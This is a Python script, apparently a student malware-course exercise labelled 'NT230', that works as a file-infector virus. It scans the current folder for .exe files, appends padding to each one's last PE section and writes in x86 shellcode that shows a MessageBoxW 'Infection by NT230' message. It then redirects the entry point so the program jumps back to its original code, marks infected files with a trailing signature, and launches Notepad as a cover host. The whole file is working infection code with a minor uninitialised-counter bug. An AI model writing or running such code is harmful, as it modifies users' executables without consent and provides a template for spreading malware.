import os
import pefile
import subprocess
import sys
import struct
HOST_FILE = "NOTEPAD.exe"
SIGNATURE = b'\x6e\x6f\x74\x65\x70\x61\x64\x00'
SHELLCODE_OFFSETS = {
    'caption': 0x40,
    'text': 0x80
}
CAPTION_TEXT = b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00\x00\x00'
TEXT_TEXT = b'\x32\x00\x33\x00\x35\x00\x32\x00\x31\x00\x37\x00\x36\x00\x31\x00\x5F\x00\x32\x00\x33\x00\x35\x00\x32\x00\x31\x00\x38\x00\x32\x00\x38\x00\x5F\x00\x32\x00\x33\x00\x35\x00\x32\x00\x31\x00\x33\x00\x30\x00\x38\x00\x00\x00'

def check_signature(pe_file):
    try:
        with open(pe_file, 'rb') as file:
            file.seek(-len(SIGNATURE), os.SEEK_END)
            return file.read(len(SIGNATURE)) == SIGNATURE
    except OSError as e:
        return False
    except Exception as e:
        return False

def find_messageboxw(pe):
    if not hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        return 0
    
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll and entry.dll.lower() == b'user32.dll':
            for imp in entry.imports:
                if imp.name and imp.name == b'MessageBoxW':
                    return imp.address
    return 0

def create_shellcode(messagebox_addr, original_entry, new_entry, image_base, file_size, pointer_to_raw, virtual_addr):
    # Tính toán địa chỉ caption và text
    caption_addr = file_size + SHELLCODE_OFFSETS['caption'] - pointer_to_raw + virtual_addr + image_base
    text_addr = file_size + SHELLCODE_OFFSETS['text'] - pointer_to_raw + virtual_addr + image_base
    
    # Tính relative jump để quay lại entry point gốc
    relative_va = (original_entry + image_base) - (new_entry + 0x14 + 0x5)
    
    shellcode = b''
    shellcode += b'\x6A\x00'  # push 0
    shellcode += struct.pack('<I', caption_addr)  # push caption
    shellcode += struct.pack('<I', text_addr)     # push text  
    shellcode += b'\x6A\x00'  # push 0
    shellcode += b'\xFF\x15' + struct.pack('<I', messagebox_addr)  # call MessageBoxW
    shellcode += b'\xE9' + struct.pack('<i', relative_va)  # jmp to original entry point
    
    return shellcode

def infect_file(pe_file):
    try:
        pe = pefile.PE(pe_file)
    except Exception as e:
        return False

    if pe.FILE_HEADER.NumberOfSections == 0:
        print(f"{pe_file}: Không có sections")
        return False

    messagebox_addr = find_messageboxw(pe)
    if messagebox_addr == 0:
        print(f"{pe_file}: Không tìm thấy MessageBoxW")
        return False

    last_section = pe.sections[-1]
    original_file_size = os.path.getsize(pe_file)
    
    shellcode_size = len(create_shellcode(0, 0, 0, 0, 0, 0, 0))  # Get size với dummy values
    total_padding = max(512, shellcode_size + max(SHELLCODE_OFFSETS.values()) + 
                       len(CAPTION_TEXT) + len(TEXT_TEXT) + len(SIGNATURE))
    
    # Căn chỉnh theo FileAlignment
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    total_padding = ((total_padding + file_alignment - 1) // file_alignment) * file_alignment

    try:
        # padding vào cuối file
        with open(pe_file, 'ab') as f:
            f.write(b'\x00' * total_padding)
        
        # PE structure
        last_section.Misc_VirtualSize += total_padding
        last_section.SizeOfRawData += total_padding
        pe.OPTIONAL_HEADER.SizeOfImage = pe.OPTIONAL_HEADER.SizeOfImage + total_padding
        
        # new entry point
        new_entry_point = (original_file_size - last_section.PointerToRawData + 
                         last_section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase)
        original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point - pe.OPTIONAL_HEADER.ImageBase
        
        shellcode = create_shellcode(
            messagebox_addr, original_entry_point, new_entry_point,
            pe.OPTIONAL_HEADER.ImageBase, original_file_size,
            last_section.PointerToRawData, last_section.VirtualAddress
        )
        
        with open(pe_file, 'r+b') as f:
            f.seek(original_file_size)
            f.write(shellcode)
            f.seek(original_file_size + SHELLCODE_OFFSETS['caption'])
            f.write(CAPTION_TEXT)
            f.seek(original_file_size + SHELLCODE_OFFSETS['text'])
            f.write(TEXT_TEXT)
        
        with open(pe_file, 'r+b') as f:
            f.seek(0)
            f.write(pe.write())
        
        with open(pe_file, 'ab') as f:
            f.write(SIGNATURE)
        
        print(f"Đã lây nhiễm thành công: {pe_file}")
        return True
        
    except Exception as e:
        print(f"Lỗi trong quá trình lây nhiễm {pe_file}: {e}")
        return False

def main():
    exe_files = [f for f in os.listdir('.') 
                if os.path.isfile(f) and f.lower().endswith('.exe')]

    
    for pe_file in exe_files:
        if pe_file.lower() == HOST_FILE.lower():
            continue
            
        if check_signature(pe_file):
            print(f'{pe_file} đã bị lây nhiễm')
            continue
            
        if infect_file(pe_file):
            infected_count += 1
    
    
    if os.path.exists(HOST_FILE):
        try:
            subprocess.Popen([HOST_FILE])
        except Exception as e:
            print(f"Không thể khởi chạy {HOST_FILE}: {e}")
    else:
        print(f"Không tìm thấy {HOST_FILE}")

if __name__ == "__main__":
    main()